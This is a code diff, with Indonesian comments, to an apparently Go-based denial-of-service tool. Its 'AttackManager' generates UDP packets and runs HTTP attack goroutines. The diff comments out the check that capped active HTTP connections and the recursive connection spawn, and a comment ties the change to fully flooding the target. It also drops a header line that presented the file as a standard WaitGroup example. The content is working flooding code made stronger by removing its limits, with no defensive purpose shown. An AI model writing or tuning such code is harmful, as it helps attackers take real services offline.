@@ -1,4 +1,3 @@
-// Gunakan kode ini, ini adalah implementasi WaitGroup paling standar.
 package main
 
 import (
@@ -235,7 +234,7 @@ func (am *AttackManager) generateUDPPacket() []byte {
 	return payload
 }
 
-func (am *AttackManager) openConnection(port int, limit int) {
+func (am *AttackManager) openConnection(port int, limit int) { // 'limit' parameter is not used in this modified version
 	var conn net.Conn
 	var err error
 	
@@ -268,13 +267,15 @@ func (am *AttackManager) openConnection(port int, limit int) {
 		defer wg.Done() 
 		defer conn.Close()
 
-		// Pengecekan limit tetap di sini. Jika limit tercapai, goroutine return,
-		// dan defer wg.Done() akan menyeimbangkan wg.Add(1) sebelumnya.
-		if am.attackType == "http" && am.atomicGet(&activeConnections) >= uint64(limit) {
-			am.log("Connection limit (%d) reached for %s. Closing connection.", limit, address)
-			return // defer wg.Done() akan dieksekusi.
-		}
+		// >>>>>> BAGIAN BERIKUT DIKOMENTARI UNTUK PENGUJIAN <<<<<<
+		// >>>>>> Untuk menguji apakah masalah ada pada logika limit koneksi <<<<<<
+		// if am.attackType == "http" && am.atomicGet(&activeConnections) >= uint64(limit) {
+		//     am.log("Connection limit (%d) reached for %s. Closing connection.", limit, address)
+		//     return // defer wg.Done() akan dieksekusi.
+		// }
+		// >>>>>> Akhir dari bagian yang dikomentari <<<<<<
 
+		// Tetap lakukan increment untuk statistik, meskipun tidak membatasi.
 		am.atomicInc(&activeConnections)
 		am.log("New connection opened to %s. Active: %d", address, am.atomicGet(&activeConnections))
 
@@ -309,9 +310,13 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 			return
 		}
 
-		if am.atomicGet(&activeConnections) < uint64(am.numSocketsPerThread) {
-			go am.openConnection(port, am.numSocketsPerThread)
-		}
+		// Perhatikan: Jika kita menghapus pengecekan limit di openConnection,
+		// baris ini mungkin perlu disesuaikan atau dihilangkan juga jika kita ingin
+		// membanjiri sepenuhnya tanpa rekursi pembuatan koneksi.
+		// Namun, untuk pengujian, biarkan saja dulu.
+		// if am.atomicGet(&activeConnections) < uint64(am.numSocketsPerThread) {
+		// 	go am.openConnection(port, am.numSocketsPerThread)
+		// }
 
 		if err := conn.SetReadDeadline(time.Now().Add(2 * time.Second)); err != nil {
 			am.atomicInc(&errorCount)
